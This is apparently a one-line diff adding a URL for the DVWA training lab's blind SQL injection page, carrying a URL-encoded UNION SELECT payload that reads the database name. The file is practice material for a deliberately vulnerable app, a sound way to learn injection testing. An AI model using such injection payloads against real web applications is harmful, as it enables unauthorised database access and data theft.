@@ -1,0 +1,1 @@
+http://<ip address>/dvwa/vulnerabilities/sqli_blind/?id=1%27%20union%20select%201,database()%23&Submit=Submit#
